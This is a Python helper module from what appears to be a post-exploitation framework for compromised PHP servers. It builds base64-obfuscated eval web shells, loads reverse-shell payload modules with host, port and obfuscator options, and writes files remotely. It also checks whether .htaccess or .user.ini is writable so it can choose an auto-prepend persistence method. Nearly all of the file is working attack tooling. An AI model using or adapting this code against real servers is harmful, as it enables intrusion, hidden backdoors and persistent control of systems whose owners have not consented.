#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared helpers for PHP session post modules."""

from __future__ import annotations

import base64
import importlib
import re
from typing import Optional

from core.framework.failure import FailureType, ProcedureError


class PhpPostHelper:
    @staticmethod
    def escape_php(value: str) -> str:
        return (value or "").replace("\\", "\\\\").replace("'", "\\'")

    def _opt(self, option) -> str:
        return str(option.value if hasattr(option, "value") else option or "").strip()

    def load_payload_module(self, import_path: str):
        normalized = import_path.replace("/", ".").strip(".")
        module_path = f"modules.{normalized}"
        mod = importlib.import_module(module_path)
        cls = getattr(mod, "Module", None)
        if not cls:
            raise ProcedureError(FailureType.ConfigurationError, f"No Module class in {module_path}")
        instance = cls(framework=getattr(self, "framework", None))
        for name in ("lhost", "lport", "rhost", "rport", "encoder", "transform", "obfuscator"):
            if hasattr(self, name) and hasattr(instance, name):
                value = getattr(self, name)
                if hasattr(value, "value"):
                    value = value.value
                if value not in (None, ""):
                    instance.set_option(name, value)
        return instance

    def generate_payload(self, payload_path: str) -> str:
        path = (payload_path or "").strip()
        if not path:
            raise ProcedureError(FailureType.ConfigurationError, "payload_path is required")
        payload_mod = self.load_payload_module(path)
        if not hasattr(payload_mod, "generate"):
            raise ProcedureError(FailureType.ConfigurationError, f"{path} has no generate() method")
        generated = payload_mod.generate()
        if not generated or not isinstance(generated, str):
            raise ProcedureError(FailureType.Unknown, f"Failed to generate payload from {path}")
        return generated.strip()

    @staticmethod
    def embed_eval_payload(php_code: str) -> str:
        b64 = base64.b64encode(php_code.encode("utf-8")).decode("ascii")
        return f'eval(base64_decode("{b64}"));'

    @staticmethod
    def php_shell_file(php_code: str) -> str:
        body = PhpPostHelper.embed_eval_payload(php_code)
        return f"<?php {body} ?>\n"

    def php_write_file(self, remote_path: str, content: str, mode: Optional[int] = None) -> bool:
        path = self.escape_php(remote_path)
        payload_b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        chmod = ""
        if mode is not None:
            chmod = f"@chmod('{path}', {int(mode)});"
        php = f"""
$path = '{path}';
$data = base64_decode('{payload_b64}');
$dir = dirname($path);
if (!is_dir($dir)) {{
    @mkdir($dir, 0755, true);
}}
$ok = (@file_put_contents($path, $data) !== false);
{chmod}
echo $ok ? 'KS_WRITE_OK' : 'KS_WRITE_FAIL';
"""
        result = self.cmd_execute(php)
        return result is not None and "KS_WRITE_OK" in result

    def php_is_writable(self, path: str) -> bool:
        php = f"""
$p = '{self.escape_php(path)}';
if (is_dir($p)) {{
    echo is_writable($p) ? 'KS_WRITABLE' : 'KS_NOT_WRITABLE';
}} elseif (file_exists($p)) {{
    echo is_writable($p) ? 'KS_WRITABLE' : 'KS_NOT_WRITABLE';
}} else {{
    $d = dirname($p);
    echo (is_dir($d) && is_writable($d)) ? 'KS_WRITABLE' : 'KS_NOT_WRITABLE';
}}
"""
        result = self.cmd_execute(php)
        return "KS_WRITABLE" in (result or "")

    def php_file_exists(self, path: str) -> bool:
        php = f"echo file_exists('{self.escape_php(path)}') ? 'KS_EXISTS' : 'KS_MISSING';"
        return "KS_EXISTS" in (self.cmd_execute(php) or "")

    def php_detect_stack(self, web_dir: str = "") -> dict:
        wd = self.escape_php(web_dir)
        php = f"""
$web = '{wd}';
if ($web === '') {{
    $web = isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== ''
        ? rtrim($_SERVER['DOCUMENT_ROOT'], '/')
        : getcwd();
}}
$sapi = php_sapi_name();
$server = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '';
$userIni = ini_get('user_ini.filename');
$userTtl = ini_get('user_ini.cache_ttl');
$ht = $web . '/.htaccess';
$ui = $web . '/.user.ini';
echo 'WEB=' . $web . "\\n";
echo 'SAPI=' . $sapi . "\\n";
echo 'SERVER=' . $server . "\\n";
echo 'USER_INI=' . ($userIni ?: '') . "\\n";
echo 'USER_INI_TTL=' . ($userTtl ?: '') . "\\n";
echo 'WRITABLE_WEB=' . (is_writable($web) ? '1' : '0') . "\\n";
echo 'WRITABLE_HT=' . ((file_exists($ht) ? is_writable($ht) : is_writable($web)) ? '1' : '0') . "\\n";
echo 'WRITABLE_UI=' . ((file_exists($ui) ? is_writable($ui) : is_writable($web)) ? '1' : '0') . "\\n";
echo 'APACHE_LIKE=' . ((stripos($sapi, 'apache') !== false || stripos($server, 'apache') !== false) ? '1' : '0') . "\\n";
echo 'FPM_LIKE=' . ((stripos($sapi, 'fpm') !== false || stripos($server, 'nginx') !== false) ? '1' : '0') . "\\n";
"""
        raw = self.cmd_execute(php) or ""
        out: dict = {}
        for line in raw.splitlines():
            if "=" in line:
                key, val = line.split("=", 1)
                out[key.strip()] = val.strip()
        return out

    @staticmethod
    def parse_stack_flags(stack: dict) -> dict:
        return {
            "web_dir": stack.get("WEB", ""),
            "sapi": stack.get("SAPI", ""),
            "server": stack.get("SERVER", ""),
            "user_ini": stack.get("USER_INI", ""),
            "writable_web": stack.get("WRITABLE_WEB") == "1",
            "writable_htaccess": stack.get("WRITABLE_HT") == "1",
            "writable_user_ini": stack.get("WRITABLE_UI") == "1",
            "apache_like": stack.get("APACHE_LIKE") == "1",
            "fpm_like": stack.get("FPM_LIKE") == "1",
        }

    def choose_prepend_methods(self, stack: dict, mode: str) -> list:
        flags = self.parse_stack_flags(stack)
        mode = (mode or "auto").lower()
        if mode == "htaccess":
            return ["htaccess"] if flags["writable_htaccess"] else []
        if mode == "user_ini":
            return ["user_ini"] if flags["writable_user_ini"] and flags["user_ini"] else []
        if mode == "both":
            methods = []
            if flags["writable_htaccess"]:
                methods.append("htaccess")
            if flags["writable_user_ini"] and flags["user_ini"]:
                methods.append("user_ini")
            return methods

        # auto
        methods = []
        if flags["fpm_like"] and flags["writable_user_ini"] and flags["user_ini"]:
            methods.append("user_ini")
        elif flags["apache_like"] and flags["writable_htaccess"]:
            methods.append("htaccess")
        elif flags["writable_user_ini"] and flags["user_ini"]:
            methods.append("user_ini")
        elif flags["writable_htaccess"]:
            methods.append("htaccess")
        return methods

    def probe_php(self, name: str, php_snippet: str, expect_pattern: str) -> dict:
        wrapped = f"""
@error_reporting(0);
ob_start();
try {{
    {php_snippet}
}} catch (Throwable $e) {{
    echo 'KS_ERR:' . $e->getMessage();
}}
$out = ob_get_clean();
echo 'KS_PROBE:{name}:' . base64_encode($out);
"""
        raw = self.cmd_execute(wrapped.replace("{name}", self.escape_php(name))) or ""
        match = re.search(rf"KS_PROBE:{re.escape(name)}:([A-Za-z0-9+/=]+)", raw)
        if not match:
            return {"name": name, "status": "blocked", "output": raw[:500]}
        try:
            output = base64.b64decode(match.group(1)).decode("utf-8", errors="replace")
        except Exception:
            output = ""
        if "KS_ERR:" in output:
            return {"name": name, "status": "error", "output": output}
        if expect_pattern and re.search(expect_pattern, output, re.I | re.S):
            return {"name": name, "status": "ok", "output": output[:1000]}
        if not expect_pattern and output.strip():
            return {"name": name, "status": "ok", "output": output[:1000]}
        return {"name": name, "status": "blocked", "output": output[:1000]}
